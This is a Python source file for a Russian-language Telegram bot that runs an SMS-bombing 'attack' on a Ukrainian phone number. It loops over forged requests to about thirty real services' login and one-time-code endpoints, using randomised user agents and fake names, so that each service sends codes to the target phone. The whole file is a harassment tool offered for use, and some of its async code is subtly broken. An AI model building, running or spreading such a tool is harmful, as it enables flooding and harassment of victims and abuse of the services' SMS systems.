# - *- coding: utf- 8 -*-
from aiogram import *
from rich.progress import *

import requests
import fake_useragent
import time
import os
import asyncio
import random
import json
import logging
import threading
from threading import Thread
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils.exceptions import Throttled
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils.helper import Helper, HelperMode, ListItem
from rich.console import Console
from rich.progress import *

logging.basicConfig(level=logging.INFO)

storage = MemoryStorage()

bot = Bot(token=" ") # @BotFather

dp = Dispatcher(bot, storage=storage)

async def anti_flood(*args, **kwargs):
    m = args[0]
    await m.answer("Хватит спамить!")

proxies = None

#клавиотура
profile_button = types.KeyboardButton('📱Начать атаку')

referal_button = types.KeyboardButton('Помощь 💻')

profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button)


class dialog(StatesGroup):
    spam = State()

def generate_info():
    global _name
    global _email
    global password
    global username
    global _russian
    _russian = "".join([
        random.choice(
            "йцукенгшщзхъфывапролджэячмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ")
        for x in range(8)
    ])
    _name = "".join([
        random.choice(
            "1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ")
        for x in range(8)
    ])
    password = "".join([
        random.choice(
            "1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ")
        for x in range(11)
    ])
    username = "".join([
        random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)
    ])
    _email = ("".join([
        random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)
    ]) + "@gmail.com")

async def ukr(number):
                headers = {"User-Agent": fake_useragent.UserAgent().random}
                try:
                        await requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxies=proxies)                        
                except:
                        pass
                try:
                        await requests.post("https://x100ecommerce-api-customers.azurewebsites.net/v1/SendCode", json={"recipient": "+" + number, "retailNetworkId": "4C25DB70-1DCE-11EB-A6EC-7B643829D650", "source": "WEB"}, headers=headers, proxies=proxies)                        
                except:
                        pass
                try:
                        await requests.post("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxies=proxies)                        
                except:
                        pass
                try:
                        await requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxies=proxies)                       
                except:
                        pass
                try:
                        await requests.get(f"https://my.maxnet.ua/login/callback/+{number}", headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "check-phone", "phone": "+" + number, "username": "Руслан", "_nonce": "db4f28b9da"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://api.01.hungrygator.ru/web/auth/webotp", json={"fu": "tralala", "userLogin": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.get(f"https://pay.planetakino.ua/api/v1/auth/send-sms?phone={number}", headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://admin.topcredit.ua/api/sms/phone-verification/create", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://ucb.z.apteka24.ua/api/send/otp", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://anc.ua/authorization/auth/v2/register", json={"login": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode", json={"mobilePhone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://kasta.ua/api/v2/ssr/login-form", data={"layout": "poe", "email": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://protovar.com.ua/aj_record", data={"object": "callback", "user_name": "Сергей", "contact_phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://mytrinity.com.ua/api.php", data={"type": "recall", "phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://api.selfiecredit.com.ua/user/send-one-time-password", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://dnipro-m.ua/uk/phone-verification/", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://www.nl.ua/ua/personal/", data={"component": "bxmaker.authuserphone.login", "method": "sendCode", "phone": number, "registration": "N"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://liki24.com/vnext/api/account/create", json={"email": _email, "firstname": "Сергей", "password": "AsasinKrid00", "referenceCode": "null", "telephone": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        await requests.post("https://pwa-api.eva.ua/api/user/send-code?storeCode=ua", json={"phone": number}, headers=headers, proxies=proxies)
                except:
                        pass


@dp.message_handler(commands=['start'])
@dp.throttled(anti_flood,rate=10)
async def start(message: types.Message):
    await bot.send_message(message.chat.id, f"Приветствую, {message.from_user.first_name}\nВы в главном меню.", reply_markup=profile_keyboard)


@dp.message_handler(text='Помощь 💻')
@dp.throttled(anti_flood,rate=3)
async def help(message: types.Message):
    inline_keyboard = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='Разработчик👨‍💻', url='https://t.me/soeden1x')
    inline_keyboard = inline_keyboard.add(code_sub)
    await bot.send_message(message.chat.id, "По всем вопросам, пишите  [разработчику](https://t.me/soeden1x) 😉", disable_web_page_preview=True, parse_mode="MarkdownV2", reply_markup=inline_keyboard)

@dp.message_handler(text='📱Начать атаку')
@dp.throttled(anti_flood,rate=3)
async def echo(message: types.Message):
    await bot.send_message(message.chat.id, 'Введите номер телефона.\nПример:\n<pre>🇺🇦380xxxxxxxxx</pre>', parse_mode="html", reply_markup=profile_keyboard)

@dp.message_handler(content_types=['text'])
@dp.throttled(anti_flood, rate=3)
async def services(message: types.Message):
    inline_keyboard = types.InlineKeyboardMarkup()
    stop_attack = types.InlineKeyboardButton(text='Остановить атаку!', callback_data='stopattack')
    inline_keyboard.add(stop_attack)
    phone = (message.text)
    number = message.text.split(' ')
    if len(number[0]) == 12:  
        print(number)
        await message.answer(f'🇺🇦Атака началась на номер <pre>{phone}</pre>!', parse_mode="html", reply_markup=inline_keyboard)
        while True:
            if not await ukr(number[0]):
                break
    else:
        None

@dp.callback_query_handler(text='stopattack')
async def stop(query: types.CallbackQuery, state: FSMContext):
    await bot.delete_message(query.from_user.id, query.message.message_id)
    await bot.send_message(query.from_user.id, "Атака остановлена!")
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
